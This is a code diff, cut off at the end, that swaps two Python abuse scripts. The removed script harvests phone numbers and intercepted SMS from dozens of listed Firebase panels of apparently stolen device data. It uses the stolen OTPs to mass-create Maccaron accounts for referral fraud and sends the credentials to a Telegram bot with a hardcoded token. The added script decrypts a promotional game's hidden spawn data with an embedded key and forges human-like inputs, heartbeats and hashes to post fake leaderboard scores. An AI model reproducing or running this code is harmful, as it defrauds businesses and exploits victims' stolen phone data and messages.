@@ -1,600 +1,356 @@
-import os
-import sys
-import re
-import time
-import uuid
-import random
-import string
-import asyncio
-import logging
-import threading
-from datetime import datetime
-from collections import deque
-from typing import Optional
+import base64, hashlib, hmac, json, os, random, sys, time
+import requests
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
-import aiohttp
-from aiohttp import web
-import telebot
-from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
+BASE = "https://thunder-zone.coke2home.com"
+HERE = os.path.dirname(os.path.abspath(__file__))
+TU   = base64.b64decode("a9rc/DSXunC5PdkYlDB6KkX/evwfSTDUD8PQdaepxe0=")
 
-# Windows Event Loop Fix
-if sys.platform == 'win32':
-    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
-
-logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.WARNING)
-
-# ================= HARDCODED USER CONFIGURATION =================
-TOKEN = "8681737900:AAEJRXc7eKTS-lgpl1TjQytFP-TmxI2j4vA"
-ADMIN_ID = 8681737900
-MACCARON_REF = "MAHA282B65FD"
-
-POLL_INTERVAL = 1.0            
-NUM_WORKERS = 40               
-OTP_TIMEOUT = 35               
-
-USED_NUMBERS_FILE = "used_numbers.txt"
-telebot.apihelper.RETRY_ON_ERROR = True
-
-# Clean & Unique Firebase Panels List (Duplicates Removed)
-DEFAULT_PANELS = [
-    "https://hood-4ba1e-default-rtdb.firebaseio.com",
-    "https://lucifer-spreader-default-rtdb.firebaseio.com",
-    "https://totla-axis-default-rtdb.firebaseio.com",
-    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
-    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
-    "https://systumm-c8526-default-rtdb.firebaseio.com",
-    "https://ravan-98ef1-default-rtdb.firebaseio.com",
-    "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
-    "https://pmkishan8-6b70f-default-rtdb.firebaseio.com",
-    "https://no-admin-e0a30-default-rtdb.firebaseio.com",
-    "https://sexypayload-default-rtdb.firebaseio.com",
-    "https://love-13ffc-default-rtdb.firebaseio.com",
-    "https://deepak-c22e3-default-rtdb.firebaseio.com",
-    "https://takul-cf410-default-rtdb.firebaseio.com",
-    "https://rto-02-april06-default-rtdb.firebaseio.com",
-    "https://projectpksk05102025-default-rtdb.firebaseio.com",
-    "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
-    "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
-    "https://upandar-bb51e-default-rtdb.firebaseio.com",
-    "https://rolex-carder-default-rtdb.firebaseio.com",
-    "https://rettiugh-default-rtdb.firebaseio.com",
-    "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
-    "https://jeet-op-default-rtdb.firebaseio.com",
-    "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
-    "https://jaanubaby-f7b34-default-rtdb.firebaseio.com",
-    "https://jj-gambler-default-rtdb.firebaseio.com",
-    "https://suman-penal-default-rtdb.firebaseio.com",
-    "https://tuuui-60b15-default-rtdb.firebaseio.com",
-    "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
-    "https://rohet10-8919f-default-rtdb.firebaseio.com",
-    "https://zeni-ae60b-default-rtdb.firebaseio.com",
-    "https://maxxx-randi-default-rtdb.firebaseio.com",
-    "https://gulabi-fuddi-default-rtdb.firebaseio.com",
-    "https://comkingdir-default-rtdb.firebaseio.com",
-    "https://tracegod-168d5-default-rtdb.firebaseio.com",
-    "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
-    "https://smsforward-b2198.firebaseio.com",
-    "https://hdrbf-485ec-default-rtdb.firebaseio.com",
-    "https://bunty-51bcc-default-rtdb.firebaseio.com",
-    "https://vishal-x-aravat-default-rtdb.firebaseio.com",
-    "https://admin-cliwny-default-rtdb.firebaseio.com",
-    "https://danish-77fe3-default-rtdb.firebaseio.com",
-    "https://master-admin-6c650-default-rtdb.firebaseio.com",
-    "https://panel-op-feb4d-default-rtdb.firebaseio.com",
-    "https://your-project-id-default-rtdb.firebaseio.com",
-    "https://pm23-98f32-default-rtdb.firebaseio.com",
-    "https://iiiii-ade0e-default-rtdb.firebaseio.com",
-    "https://pint-f465b-default-rtdb.firebaseio.com",
-    "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
-    "https://callmebitchfumckyou-default-rtdb.firebaseio.com",
-    "https://demonrat-aa782-default-rtdb.firebaseio.com",
-    "https://access20-3fc38-default-rtdb.firebaseio.com",
-    "https://article-efd36-default-rtdb.firebaseio.com",
-    "https://rajababukvirat-default-rtdb.firebaseio.com",
-    "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
-    "https://sandycall-18b15-default-rtdb.firebaseio.com",
-    "https://suihd-default-rtdb.firebaseio.com",
-    "https://harrwp-6be36-default-rtdb.firebaseio.com",
-    "https://test-firebase.firebaseio.com",
-    "https://adutappbylucy-default-rtdb.firebaseio.com",
-    "https://download-b7393-default-rtdb.firebaseio.com",
-    "https://bobnewloda-default-rtdb.firebaseio.com",
-    "https://artikumari-abc97-default-rtdb.firebaseio.com",
-    "https://seuihd-default-rtdb.firebaseio.com",
-    "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
-    "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
-    "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
-    "https://priysnshuu-default-rtdb.firebaseio.com",
-    "https://haab-b3370-default-rtdb.firebaseio.com",
-    "https://ueuwuw-default-rtdb.firebaseio.com",
-    "https://test.firebaseio.com",
-    "https://jkhsadfhjk-default-rtdb.firebaseio.com",
-    "https://sonic-d5c1a-default-rtdb.firebaseio.com",
-    "https://jonisins-52271-default-rtdb.firebaseio.com",
-    "https://dusman-abf8b-default-rtdb.firebaseio.com",
-    "https://riyy-e012e-default-rtdb.firebaseio.com",
-    "https://xkpz-f937a-default-rtdb.firebaseio.com",
-    "https://hdhdhdh-38ae0-default-rtdb.firebaseio.com",
-    "https://ppoi02-default-rtdb.firebaseio.com",
-    "https://rto-e-challan--o23t-default-rtdb.firebaseio.com",
-    "https://rajapp-ca991-default-rtdb.firebaseio.com",
-    "https://lli02-dbc69-default-rtdb.firebaseio.com",
-    "https://pk114-6e828-default-rtdb.firebaseio.com"
+SCORING     = {"thunder":15,"thunder2":15,"gully":50,"firefox":50,"heart":0,"trap":0}
+DIST_FULL   = {"thunder":0.2,"thunder2":0.2,"heart":0,"trap":0.45,"gully":0.075,"firefox":0.075}
+DIST_DMG    = {"thunder":0.175,"thunder2":0.175,"heart":0.2,"trap":0.3,"gully":0.075,"firefox":0.075}
+ITEMS       = ["thunder","thunder2","heart","trap","gully","firefox"]
+DIRS        = ["up","down","left","right"]
+OPP         = {"up":"down","down":"up","left":"right","right":"left"}
+CMAP        = {"thunder":"thunder_box","thunder2":"thunder_box","thunderCan":"thunder_can",
+               "gully":"gully_labs","firefox":"firefox","heart":"heart","trap":"trap"}
+TIERS       = [
+    (15000,1000,1950),(30000,800,1540),(45000,700,1350),(60000,600,1150),
+    (75000,500,963),(90000,400,770),(105000,200,385),(120000,100,193),
+    (135000,50,96),(150000,20,39),(165000,10,19),(180000,5,10),(float("inf"),5,10)
 ]
 
-# Dynamic Panel Loader with Default Fallback
-def load_panels():
-    panels = []
-    if os.path.exists("panels.txt"):
-        with open("panels.txt", "r") as f:
-            for line in f:
-                clean_line = line.strip().strip('/')
-                if clean_line and 'firebase' in clean_line:
-                    panels.append(clean_line)
-    
-    if not panels:
-        panels = DEFAULT_PANELS
+HEADERS = {
+    "Content-Type":           "application/json",
+    "Accept":                 "application/json, text/plain, */*",
+    "Accept-Language":        "en-US,en;q=0.9",
+    "Accept-Encoding":        "gzip, deflate, br",
+    "Origin":                 BASE,
+    "Referer":                f"{BASE}/game",
+    "User-Agent":             "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+}
 
-    return list(set(panels))
+S = requests.Session()
+S.headers.update(HEADERS)
 
-RAW_URLS = load_panels()
-DATABASES = {f"DB_{i+1}": url for i, url in enumerate(RAW_URLS)}
+def cpath(p): return os.path.join(HERE, f".session_{p}.json")
 
-# ================= GLOBALS & LOCKS =================
-bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
-_http_session: Optional[aiohttp.ClientSession] = None
-GLOBAL_DEVICE_CACHE = {}
-seen_sms_ids = set()
-dead_panels = set()
-first_run = True
-
-pending_maccaron = {} 
-processed_nums = set() 
-looted_count = [0] 
-live_message_id = None 
-last_dash_text = ""
-number_queue = None
-
-LIVE_LOGS = deque(maxlen=7)
-
-def add_log(msg):
-    t = datetime.now().strftime("%H:%M:%S")
-    log_str = f"<code>[{t}]</code> {msg}"
-    LIVE_LOGS.appendleft(log_str)
-    print(f"[{t}] {msg}")
-
-FB_SEMAPHORE = asyncio.Semaphore(25) 
-
-# ================= TELEGRAM SAFE SENDER =================
-def safe_send_message(chat_id, text, **kwargs):
-    try: return bot.send_message(chat_id, text, **kwargs)
-    except Exception: return None
-
-def safe_edit_message(text, chat_id, message_id, **kwargs):
-    try: return bot.edit_message_text(text, chat_id, message_id, **kwargs)
-    except Exception: return None
-
-# ================= ERROR PARSER =================
-def parse_api_error(resp_data):
-    if not resp_data: return "Null API Response"
+def load_session(p):
     try:
-        if "errors" in resp_data and resp_data["errors"]:
-            return resp_data["errors"][0].get("message", "API Error")
-        if "data" in resp_data:
-            for v in resp_data["data"].values():
-                if isinstance(v, dict) and "errors" in v and v["errors"]:
-                    return v["errors"][0].get("message", "Nested API Error")
-    except Exception: pass
-    return str(resp_data)[:50]
+        S.cookies.clear()
+        for c in json.load(open(cpath(p))): S.cookies.set(c["name"], c["value"])
+        return True
+    except: return False
 
-# ================= UTILS =================
-def load_used_numbers():
-    if os.path.exists(USED_NUMBERS_FILE):
-        try:
-            with open(USED_NUMBERS_FILE, "r") as f:
-                processed_nums.update(line.strip() for line in f if line.strip())
-        except Exception: pass
+def save_session(p):
+    json.dump([{"name":c.name,"value":c.value} for c in S.cookies], open(cpath(p),"w"), indent=2)
 
-def save_used_number(num):
-    processed_nums.add(num)
+def _wait(): time.sleep(random.uniform(0.25, 0.75))
+
+def api(method, path, body=None):
+    for i in range(2):
+        r = S.request(method, BASE+path, json=body, timeout=30)
+        if r.status_code==401 and i==0 and "/auth/" not in path:
+            try: S.post(BASE+"/api/auth/refresh", timeout=15)
+            except: pass
+            _wait(); continue
+        return r
+    return r
+
+def authed():
     try:
-        with open(USED_NUMBERS_FILE, "a") as f:
-            f.write(f"{num}\n")
-    except Exception: pass
-
-def get_maccaron_headers():
-    return {
-        "accept": "application/graphql-response+json, application/json",
-        "content-type": "application/json",
-        "origin": "https://maccaron.in",
-        "referer": "https://maccaron.in/",
-        "user-agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-        "x-store-mode": "maccaron",
-        "traceparent": f"00-{uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-01"
-    }
-
-async def get_http_session():
-    global _http_session
-    if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, enable_cleanup_closed=True)
-        _http_session = aiohttp.ClientSession(connector=connector)
-    return _http_session
-
-async def graphql_request(query: str, variables: dict):
-    payload = {"query": query, "variables": variables}
-    match = re.search(r'(?:mutation|query)\s+(\w+)', query)
-    if match: payload["operationName"] = match.group(1)
-    
-    try:
-        session = await get_http_session()
-        async with session.post("https://graphql.maccaron.in/graphql/", json=payload, headers=get_maccaron_headers(), timeout=10) as r:
-            if r.status == 200: return await r.json()
-            elif r.status in [429, 403]: return {"error_status": r.status}
-    except Exception: pass
+        d = api("GET","/api/auth/me").json()
+        if d.get("success") and d.get("isAuthenticated"):
+            return d["user"]["phone_number"]
+    except: pass
     return None
 
-def deep_phone_extract(data):
-    phones = set()
-    valid_keys = ('sim', 'num', 'phone', 'mob')
-    def _extract(d):
-        if isinstance(d, dict):
-            for k, v in d.items():
-                if isinstance(v, (str, int)):
-                    if any(x in k.lower() for x in valid_keys):
-                        clean = re.sub(r"\D", "", str(v))
-                        if len(clean) >= 10 and clean[-10] in '6789':
-                            phones.add(clean[-10:])
-                else:
-                    _extract(v)
-        elif isinstance(d, list):
-            for item in d:
-                _extract(item)
-    _extract(data)
-    return phones
+def login(phone):
+    r = api("POST","/api/auth/send-otp",{"phone_number":phone})
+    if r.status_code != 200: sys.exit(f"OTP send failed: {r.text}")
+    otp = input("Enter OTP: ").strip()
+    _wait()
+    r = api("POST","/api/auth/verify-otp",{"phone_number":phone,"otp":otp})
+    if r.status_code != 200: sys.exit(f"OTP verify failed: {r.text}")
+    v = r.json()
+    ott = v.get("one_time_token") or (v.get("data") or {}).get("one_time_token")
+    if ott:
+        _wait()
+        api("POST","/api/auth/validate-token",{"one_time_token":ott})
+        _wait()
+        api("POST","/api/auth/exchange-token",{"one_time_token":ott})
+    save_session(phone)
 
-# ================= MACCARON API LOGIC =================
-async def trigger_maccaron_otp(phone_10d: str):
-    query = """
-    mutation createOtp($input: OtpInput!) {
-      createOtp(input: $input) {
-        otp { status }
-        errors { message }
-      }
-    }
-    """
-    resp = await graphql_request(query, {"input": {"receiver": phone_10d}})
-    
-    if resp and resp.get("error_status"): 
-        add_log(f"🚫 Rate Limit Blocked: <code>{phone_10d}</code>")
-        return "BLOCKED"
+def decrypt_drip(sid, enc):
+    if not enc: return []
+    try:
+        raw = base64.b64decode(enc)
+        key = hmac.new(TU, sid.encode(), hashlib.sha256).digest()
+        return json.loads(AESGCM(key).decrypt(raw[:12], raw[12:], None).decode())
+    except: return []
 
-    if resp and resp.get("errors"):
-        msg = parse_api_error(resp)
-        add_log(f"⚠️ Sent Failed {phone_10d}: {msg}")
-        return "FAILED"
+def get_tier(ms):
+    for until,spawn,travel in TIERS:
+        if ms < until: return spawn, travel
+    return 5, 10
 
-    if resp and not resp.get("errors"):
-        data = resp.get("data", {}).get("createOtp", {})
-        if data.get("otp", {}).get("status") == "SENT":
-            pending_maccaron[phone_10d] = {
-                "phone": phone_10d, 
-                "first_name": ''.join(random.choices(string.ascii_letters, k=6)).capitalize(),
-                "last_name": ''.join(random.choices(string.ascii_letters, k=5)).capitalize(),
-                "email": f"{uuid.uuid4().hex[:8]}@gmail.com",
-                "password": f"Mac@{uuid.uuid4().hex[:6]}#",
-                "timestamp": time.time()  
-            }
-            add_log(f"📱 OTP Sent: <code>{phone_10d}</code> (Waiting...)")
-            return "SUCCESS"
-            
-    add_log(f"❌ Failed to send OTP: <code>{phone_10d}</code>")
-    return "FAILED"
+def get_tier_idx(ms):
+    for i,(until,_,__) in enumerate(TIERS):
+        if ms < until: return i
+    return len(TIERS)-1
 
-async def verify_and_signup(phone_10d: str, otp: str):
-    data = pending_maccaron.pop(phone_10d, None)
-    if not data: return
+def pick_type(fv, hp, last, heart_ok):
+    dist = DIST_FULL if hp >= 3 else DIST_DMG
+    last1 = last[-1] if last else None
+    last2 = last[-2] if len(last)>=2 else None
+    no_rep = last1 if last1==last2 and last1 else None
+    first  = len(last)==0
+    el,wt  = [],[]
+    for item in ITEMS:
+        w = dist[item]
+        if w<=0 or item==no_rep: continue
+        if item=="heart" and (hp>=3 or not heart_ok): continue
+        if item=="trap" and first: continue
+        el.append(item); wt.append(w)
+    if not el:
+        for item in ITEMS:
+            w = dist[item]
+            if w<=0: continue
+            if item=="heart" and (hp>=3 or not heart_ok): continue
+            if item=="trap" and first: continue
+            el.append(item); wt.append(w)
+    rem = fv * sum(wt)
+    for i,w in enumerate(wt):
+        rem -= w
+        if rem < 0: return el[i]
+    return el[-1]
+
+def reaction_ms(travel):
+    base = random.uniform(500, 650)
+    jitter = random.gauss(0, 20)
+    return max(400, base + jitter)
+
+def chain_hash(sid, log):
+    moves = ",".join(f"{e['boxId']}:{e['dir']}" for e in log)
+    return hashlib.sha256(f"{sid}|{moves}".encode()).hexdigest()
+
+def run():
+    min_duration = 91.5
+    max_duration = 93.5
     
-    add_log(f"🔑 Verifying OTP <code>{otp}</code> for {phone_10d}...")
-    
-    verify_query = """
-    mutation verifyOtp($input: VerifyOtpInput!) {
-      verifyOtp(input: $input) {
-        otp { id }
-        verified
-        errors { message }
-      }
-    }
-    """
-    resp = await graphql_request(verify_query, {"input": {"receiver": data["phone"], "value": otp}})
-    
-    if not resp:
-        add_log(f"⚠️ API Timeout / Blocked for <code>{phone_10d}</code>")
+    print(f"\nAuto-running. Stop at {min_duration}s or HP=0.\n")
+
+    time.sleep(random.uniform(1.2, 3.5))
+    r = api("POST","/api/thunder-trail/sessions",{})
+    if r.status_code not in (200,201): sys.exit(f"Session open failed: {r.text}")
+    d = r.json()["data"]
+    sid, token = d["session_id"], d["session_token"]
+    seed = d.get("seed", 0)
+    print(f"Session: {sid[:12]}... | Seed: {seed}")
+
+    floats = decrypt_drip(sid, d.get("drip_enc",""))
+    print(f"Floats decrypted: {len(floats)} ({len(floats)//2} boxes)")
+
+    time.sleep(random.uniform(2.5, 4.5))
+
+    hp = 3
+    score, nxt, bid = 0, 0.0, 1
+    combo, max_combo = 0, 0
+    hits, last_types, log = {}, [], []
+    cursor, committed = 0, 0
+    heart_gate = {"boxes":0,"traps":0,"others":0,"hp_last":3}
+    pending_hg = None
+
+    t0 = time.time()
+    last_hb = t0
+    hb_n = 0
+
+    while True:
+        elapsed = time.time() - t0
+        if hp <= 0:
+            print(f"\nHP reached 0. Stopping.")
+            break
+        if elapsed >= max_duration:
+            break
+
+        gms = elapsed * 1000.0
+
+        rem_boxes = (len(floats) - cursor) // 2
+        if rem_boxes < 15:
+            fb = cursor // 2
+            rr = api("POST", f"/api/thunder-trail/sessions/{sid}/drip-refill",
+                     {"session_token":token,"from_box":fb})
+            if rr.status_code == 200:
+                rd = rr.json()
+                nf = decrypt_drip(sid, rd.get("drip_enc"))
+                fb2 = rd.get("drip_from_box", fb)
+                ti = 2 * fb2
+                if ti > len(floats): floats.extend([0.5]*(ti-len(floats)))
+                floats[ti:ti+len(nf)] = nf
+                print(f"\nRefill: {len(nf)} floats at box #{fb2}")
+
+        if gms < nxt:
+            time.sleep(min(0.04, (nxt-gms)/1000.0))
+            continue
+
+        spawn_ms = nxt
+        sp_ev, travel = get_tier(spawn_ms)
+        nxt += sp_ev
+
+        if cursor >= len(floats):
+            print("\nOut of floats, breaking to submit safely.")
+            break
+        fv_t = floats[cursor]; cursor += 1
+        if cursor >= len(floats):
+            print("\nOut of floats, breaking to submit safely.")
+            break
+        fv_d = floats[cursor]; cursor += 1
+
+        if hp < heart_gate["hp_last"]:
+            heart_gate["boxes"] = 0; heart_gate["traps"] = 0; heart_gate["others"] = 0
+            pending_hg = None
+        elif pending_hg is not None:
+            if pending_hg == "heart":
+                heart_gate["boxes"] = 0; heart_gate["traps"] = 0; heart_gate["others"] = 0
+            elif pending_hg == "trap":
+                heart_gate["boxes"] += 1; heart_gate["traps"] += 1
+            else:
+                heart_gate["boxes"] += 1; heart_gate["others"] += 1
+            pending_hg = None
+        heart_gate["hp_last"] = hp
+        heart_ok = heart_gate["boxes"]>=7 and heart_gate["traps"]>=2 and heart_gate["others"]>=3
+
+        btype  = pick_type(fv_t, hp, last_types, heart_ok)
+        barrow = DIRS[int(fv_d * 4)]
+
+        pending_hg = btype
+
+        last_types.append(btype)
+        if len(last_types) > 2: last_types.pop(0)
+
+        swipe_at = spawn_ms + reaction_ms(travel)
+        swipe_at += random.uniform(-15, 15)
+
+        now = time.time()
+        wait = t0 + swipe_at/1000.0 - now
+        if wait > 0: time.sleep(wait)
+
+        if btype in ("thunder","thunder2","gully","firefox"):
+            swipe_dir = barrow
+            score += SCORING[btype]
+            combo += 1; max_combo = max(max_combo, combo)
+            hits[btype] = hits.get(btype,0) + 1
+        elif btype == "trap":
+            swipe_dir = OPP[barrow]
+            combo += 1; max_combo = max(max_combo, combo)
+            hits["trap"] = hits.get("trap",0) + 1
+        else:
+            swipe_dir = barrow
+            if hp < 3: hp += 1
+            combo += 1; max_combo = max(max_combo, combo)
+            hits["heart"] = hits.get("heart",0) + 1
+
+        log.append({"boxId":bid,"dir":swipe_dir,"atMs":round(swipe_at,1),
+                    "spawnAtMs":round(spawn_ms,1)})
+        bid += 1
+
+        now = time.time()
+        hb_interval = random.uniform(4.2, 6.2)
+        if now - last_hb >= hb_interval:
+            delta = [{"boxId":e["boxId"],"dir":e["dir"],"atMs":e["atMs"],"spawnAtMs":e["spawnAtMs"]}
+                     for e in log[committed:]]
+            hb_pay = {"session_token":token,"boxes_seen":len(log),"score_so_far":score,
+                      "paused":False,"at_ms":round(swipe_at,1),"boxes_committed":len(log),
+                      "chain_hash":chain_hash(sid,log),"input_log_delta":delta}
+            hr = api("POST",f"/api/thunder-trail/sessions/{sid}/heartbeat",hb_pay)
+            if hr.status_code == 200:
+                hb_n += 1; committed = len(log); last_hb = now
+                hd = hr.json()
+                if hd.get("drip_enc"):
+                    nf2 = decrypt_drip(sid,hd["drip_enc"])
+                    fb3 = hd.get("drip_from_box",0)
+                    ti2 = 2*fb3
+                    if ti2>len(floats): floats.extend([0.5]*(ti2-len(floats)))
+                    floats[ti2:ti2+len(nf2)] = nf2
+
+        sys.stdout.write(f"\r Score: {score} | HP: {hp}/3 | Box: #{bid-1} | Combo: {combo} | HB: #{hb_n} ")
+        sys.stdout.flush()
+
+    dur = (time.time() - t0) * 1000.0
+    if log:
+        dur = log[-1]["atMs"] + random.uniform(280, 480)
+
+    print(f"\n\nScore   : {score}")
+    print(f"Moves   : {len(log)}")
+    print(f"Combo   : {max_combo}")
+    print(f"Dur     : {dur/1000:.1f}s")
+
+    bc = {}
+    for k,v in hits.items():
+        mk = CMAP.get(k,k); bc[mk] = bc.get(mk,0) + v
+
+    delta_fin = [{"boxId":e["boxId"],"dir":e["dir"],"atMs":e["atMs"],"spawnAtMs":e["spawnAtMs"]}
+                 for e in log[committed:]]
+    api("POST",f"/api/thunder-trail/sessions/{sid}/heartbeat",{
+        "session_token":token,"boxes_seen":len(log),"score_so_far":score,
+        "paused":False,"at_ms":round(dur,1),"boxes_committed":len(log),
+        "chain_hash":chain_hash(sid,log),"input_log_delta":delta_fin
+    })
+
+    _wait()
+    sc_pay = {"session_token":token,"final_score":score,"duration_ms":round(dur,1),
+              "max_combo":max_combo,"box_counts":bc,"seed":seed,"input_log":log}
+    sr = api("POST",f"/api/thunder-trail/sessions/{sid}/score",sc_pay)
+    print(f"\n[Score]   {sr.status_code} | {sr.text}")
+
+    _wait()
+    jr_pay = {"session_token":token,"seed":seed,"input_log":log,"final_score":score,
+              "duration_ms":round(dur,1),"max_combo":max_combo,"hit_counts":bc,
+              "max_tier_reached":get_tier_idx(dur)+1}
+    jr = api("POST",f"/api/thunder-trail/sessions/{sid}/journey",jr_pay)
+    print(f"[Journey] {jr.status_code} | {jr.text}")
+
+    time.sleep(2.0)
+    br = api("GET","/api/thunder-trail/sub-leaderboard")
+    if br.status_code == 200:
+        bd = br.json().get("data",{})
+        print("\n" + "="*50)
+        print("  LEADERBOARD - TOP 15")
+        print("="*50)
+        for e in (bd.get("entries") or [])[:15]:
+            you = " <-- YOU" if e.get("is_me") else ""
+            print(f"  #{e['rank']:>2}  {e['username']:<16}{e['score']:>6}{you}")
+        print("-"*50)
+        print(f"  Your Rank  : {bd.get('me_rank')}")
+        print(f"  Your Score : {bd.get('me_score')}")
+        print("="*50)
+
+def main():
+    print("="*44)
+    print("  Thunder Trail Bot")
+    print("="*44)
+
+    raw = input("\nMobile number (10 digits): ").strip()
+    phone = "".join(c for c in raw if c.isdigit())[-10:]
+    if len(phone) != 10: sys.exit("Need 10 digits.")
+
+    if load_session(phone) and authed() == phone:
+        print("Session active — no OTP needed")
+    else:
+        S.cookies.clear()
+        login(phone)
+
+    me = api("GET","/api/thunder-trail/me").json().get("data",{})
+    print(f"\n  Username   : {me.get('username')}")
+    print(f"  Best Score : {me.get('best_score')}")
+    print(f"  Plays Left : {me.get('plays_remaining')} / 5")
+    print(f"  Resets At  : {me.get('resets_at')}")
+
+    if me.get("plays_remaining", 0) == 0:
+        print("\nNo plays left today. Resets at midnight IST.")
         return
 
-    is_verified = resp.get("data", {}).get("verifyOtp", {}).get("verified")
-
-    if is_verified:
-        otp_id = resp["data"]["verifyOtp"]["otp"]["id"]
-        
-        signup_query = """
-        mutation customerSignUp($input: CustomerSignUpInput!) {
-          customerSignUp(input: $input) { 
-            user { id email } 
-            errors { message }
-          }
-        }
-        """
-        signup_vars = {
-            "input": {
-                "firstName": data["first_name"], "lastName": data["last_name"],
-                "email": data["email"], "password": data["password"],
-                "otpId": otp_id, "otpValue": otp, "mobileNumber": data["phone"],
-                "referralCode": MACCARON_REF, "signupPlatform": "Web"
-            }
-        }
-        
-        sign_resp = await graphql_request(signup_query, signup_vars)
-        if sign_resp and sign_resp.get("data", {}).get("customerSignUp", {}).get("user"):
-            looted_count[0] += 1
-            add_log(f"🎉 <b>SUCCESS! Looted:</b> <code>{phone_10d}</code>")
-            
-            succ_msg = (
-                f"🎉 <b>MACCARON LOOT SUCCESS!</b>\n\n"
-                f"📱 <b>Number:</b> {data['phone']}\n"
-                f"📧 <b>Email:</b> <code>{data['email']}</code>\n"
-                f"🔑 <b>Pass:</b> <code>{data['password']}</code>\n"
-                f"🎁 <b>Code Used:</b> {MACCARON_REF}\n"
-            )
-            safe_send_message(ADMIN_ID, succ_msg, parse_mode="HTML")
-            
-        else:
-            err = parse_api_error(sign_resp)
-            add_log(f"⚠️ Signup Failed {phone_10d}: {err}")
-    else:
-        err = parse_api_error(resp)
-        add_log(f"❌ Verify Failed <code>{phone_10d}</code>: {err}")
-
-# ================= FIREBASE POLLING =================
-async def fb_get(path: str, base: str):
-    if base in dead_panels: return None
-    try:
-        session = await get_http_session()
-        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
-        async with session.get(url, timeout=5) as r:
-            if r.status == 200:
-                data = await r.json(content_type=None)
-                return data if isinstance(data, dict) else None
-    except Exception: return None
-
-async def fetch_db_data_safe(tag: str, url: str):
-    async with FB_SEMAPHORE:
-        devices = []
-        try:
-            sim, info, user, clients = await asyncio.gather(
-                fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url), 
-                fb_get("user_data", url), fb_get("clients", url), return_exceptions=True
-            )
-            
-            dev_map = {}
-            def add_nums(d_id, data_node):
-                if not data_node: return
-                nums = deep_phone_extract(data_node)
-                if nums: dev_map.setdefault(d_id, set()).update(nums)
-
-            if isinstance(sim, dict):
-                for k, v in sim.items(): add_nums(k, v)
-            if isinstance(info, dict):
-                for k, v in info.items(): add_nums(k, v)
-            if isinstance(user, dict):
-                for k, v in user.items(): add_nums(k, v)
-            if isinstance(clients, dict):
-                for k, v in clients.items(): add_nums(k, v)
-            
-            for d_id, nums in dev_map.items():
-                devices.append({"id": d_id, "numbers": list(nums), "base": url})
-
-        except Exception: 
-            dead_panels.add(url)
-        return devices
-
-async def poll_single_db(url: str):
-    global first_run
-    async with FB_SEMAPHORE:
-        if url in dead_panels: return
-        try:
-            r_main, r_user, r_root = await asyncio.gather(
-                fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True
-            )
-            
-            devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d["base"] == url]
-            dev_map = {d["id"]: d for d in devices}
-            
-            for bulk in (r_main, r_user, r_root):
-                if not isinstance(bulk, dict): continue
-                for dev_id, sms_dict in bulk.items():
-                    if not isinstance(sms_dict, dict): continue
-                    
-                    device = dev_map.get(dev_id)
-                    
-                    for k, sms in sms_dict.items():
-                        if not isinstance(sms, dict): continue
-                        
-                        sk = f"{url}/{dev_id}/{k}"
-                        if sk in seen_sms_ids: continue
-                        seen_sms_ids.add(sk)
-                        
-                        if first_run: continue
-                        
-                        body = str(sms.get("body") or sms.get("message") or "").lower()
-                        
-                        if "maccaron" in body or "verification" in body:
-                            otp_match = re.search(r'\b(\d{6})\b', body)
-                            if otp_match:
-                                otp = otp_match.group(1)
-                                matched = False
-                                
-                                if device:
-                                    for num in device.get("numbers", []):
-                                        if num in pending_maccaron:
-                                            asyncio.create_task(verify_and_signup(num, otp))
-                                            matched = True
-                                
-                                if not matched and len(pending_maccaron) > 0:
-                                    oldest_num = list(pending_maccaron.keys())[0]
-                                    asyncio.create_task(verify_and_signup(oldest_num, otp))
-        except Exception: pass
-
-# ================= ASYNC LOOPS =================
-async def update_cache_loop():
-    while True:
-        try:
-            tasks = [fetch_db_data_safe(tag, url) for tag, url in DATABASES.items() if url not in dead_panels]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            all_devices = [item for sublist in results if isinstance(sublist, list) for item in sublist]
-            GLOBAL_DEVICE_CACHE["ALL"] = all_devices
-            
-            for dev in all_devices:
-                for num in dev.get("numbers", []):
-                    if num not in processed_nums and num not in pending_maccaron:
-                        save_used_number(num)
-                        await number_queue.put(num)
-        except Exception: pass
-        await asyncio.sleep(10) 
-
-async def api_worker(worker_id):
-    while True:
-        try:
-            num = await number_queue.get()
-            result = await trigger_maccaron_otp(num)
-            
-            if result == "BLOCKED":
-                await asyncio.sleep(4) 
-                await number_queue.put(num)
-                
-        except Exception: pass
-        finally:
-            number_queue.task_done()
-            await asyncio.sleep(0.1)
-
-async def otp_janitor():
-    while True:
-        try:
-            current_time = time.time()
-            expired = [num for num, data in pending_maccaron.items() if current_time - data.get("timestamp", current_time) > OTP_TIMEOUT]
-            for num in expired:
-                pending_maccaron.pop(num, None)
-                add_log(f"🗑️ Dropped <code>{num}</code> (No OTP in {OTP_TIMEOUT}s)")
-        except Exception: pass
-        await asyncio.sleep(2)
-
-async def poll_loop():
